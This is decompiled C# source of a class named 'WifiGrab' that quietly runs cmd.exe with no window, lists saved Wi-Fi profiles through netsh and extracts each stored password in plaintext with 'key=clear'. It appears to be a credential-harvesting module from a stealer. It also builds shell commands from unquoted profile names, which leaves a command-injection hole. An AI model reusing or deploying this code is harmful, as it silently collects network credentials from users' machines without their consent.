using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Recovery
{
	// Token: 0x02000008 RID: 8
	internal class WifiGrab
	{
		// Token: 0x06000014 RID: 20 RVA: 0x0000312C File Offset: 0x0000132C
		public static StringBuilder Recovery(StringBuilder stringBuilder)
		{
			List<string> profiles = WifiGrab.GetProfiles();
			foreach (string str in profiles)
			{
				stringBuilder.Append(str + "\n");
			}
			return stringBuilder;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x0000319C File Offset: 0x0000139C
		public static string Execute(string command)
		{
			Process process = new Process();
			ProcessStartInfo startInfo = new ProcessStartInfo("cmd")
			{
				UseShellExecute = false,
				RedirectStandardInput = true,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				CreateNoWindow = true
			};
			process.StartInfo = startInfo;
			process.Start();
			StreamWriter standardInput = process.StandardInput;
			TextReader standardOutput = process.StandardOutput;
			standardInput.AutoFlush = true;
			standardInput.WriteLine(command);
			standardInput.Close();
			return standardOutput.ReadToEnd();
		}

		// Token: 0x06000016 RID: 22 RVA: 0x0000322C File Offset: 0x0000142C
		public static List<string> GetProfiles()
		{
			List<string> list = new List<string>();
			string text = WifiGrab.Execute("netsh wlan show profiles");
			int num = text.IndexOf("User profiles", StringComparison.Ordinal);
			text = text.Substring(num + 28);
			bool flag = true;
			while (flag)
			{
				num = text.IndexOf(" : ", StringComparison.Ordinal);
				bool flag2 = num == -1;
				if (flag2)
				{
					flag = false;
				}
				else
				{
					int startIndex = num + 3;
					text = text.Substring(startIndex);
					int num2 = text.IndexOf("\n", StringComparison.Ordinal) - 1;
					string text2 = text.Substring(0, num2);
					text = text.Substring(num2);
					list.Add(text2 + ": " + WifiGrab.GetProfileKey(text2));
					list.Add("=============================");
				}
			}
			return list;
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00003300 File Offset: 0x00001500
		public static string GetProfileKey(string profile)
		{
			string text = WifiGrab.Execute("netsh wlan show profile name=" + profile + " key=clear");
			string result = "";
			int num = text.IndexOf("Key Content            :", StringComparison.Ordinal);
			bool flag = num != -1;
			if (flag)
			{
				text = text.Substring(num);
				int length = text.IndexOf("\r", StringComparison.Ordinal) - 25;
				result = text.Substring(25, length);
			}
			return result;
		}
	}
}
